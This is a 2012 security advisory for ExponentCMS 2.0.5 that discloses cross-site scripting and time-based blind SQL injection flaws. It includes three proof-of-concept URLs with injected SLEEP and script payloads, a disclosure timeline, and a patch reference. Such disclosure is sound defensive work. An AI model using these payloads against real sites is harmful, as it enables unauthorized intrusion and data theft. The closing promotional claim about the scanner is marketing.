@@ -1,0 +1,68 @@
+Information
+--------------------
+Name :  XSS and Blind SQL Injection Vulnerabilities in ExponentCMS
+Software :  ExponentCMS 2.0.5 and possibly below.
+Vendor Homepage :  http://www.exponentcms.org
+Vulnerability Type :  Cross-Site Scripting and SQL Injection
+Severity :  Critical
+Researcher :  Onur Y?lmaz
+Advisory Reference :  NS-12-006
+
+Description
+--------------------
+Exponent is a website content management system (or CMS) that allows
+site owners to easily create and manage dynamic websites without
+necessarily directly coding web pages, or managing site navigation.
+
+Details
+--------------------
+Exponent CMS is affected by XSS and SQL Injection vulnerabilities in
+version 2.0.5.
+
+Example PoC urls are as follows :
+http://example.com/index.php?section=(SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)
+http://example.com/index.php?action=showall_by_tags&tag=%27%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert(1337)%3C/script%3E&controller=news&src=
+ () random4e5433b85bb1f
+http://example.com/index.php?controller=expTag&action=show&title=changes&src=%27%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert(1337)%3C/script%3E
+
+You can read the full article about Cross-Site Scripting and SQL
+Injection vulnerabilities from here :
+http://www.mavitunasecurity.com/crosssite-scripting-xss/
+http://www.mavitunasecurity.com/sql-injection/
+
+Solution
+--------------------
+The vendor fixed this vulnerability in the new version. Please see the
+references.
+
+Advisory Timeline
+--------------------
+12/03/2012 - First contact: Sent the vulnerability details
+20/03/2012 - Vulnerability Fixed in latest version
+25/04/2012 - Vulnerability Released
+
+Credits
+--------------------
+It has been discovered on testing of Netsparker, Web Application
+Security Scanner - http://www.mavitunasecurity.com/netsparker/.
+
+References
+--------------------
+Vendor Url / Patch :
+http://exponentcms.org/news/-happy-hyperbole-v2-0-6-is-in-full-bloom
+MSL Advisory Link :
+http://www.mavitunasecurity.com/blog/xss-and-blind-sql-injection-vulnerabilities-in-exponentcms/
+Netsparker Advisories : http://www.mavitunasecurity.com/netsparker-advisories/
+
+About Netsparker
+--------------------
+Netsparker® can find and report security issues such as SQL Injection
+and Cross-site Scripting (XSS) in all web applications regardless of
+the platform and the technology they are built on. Netsparker's unique
+detection and exploitation techniques allows it to be dead accurate in
+reporting hence it's the first and the only False Positive Free web
+application security scanner.
+
+-- 
+Netsparker Advisories, <advisories () mavitunasecurity com>
+Homepage, http://www.mavitunasecurity.com/netsparker-advisories/
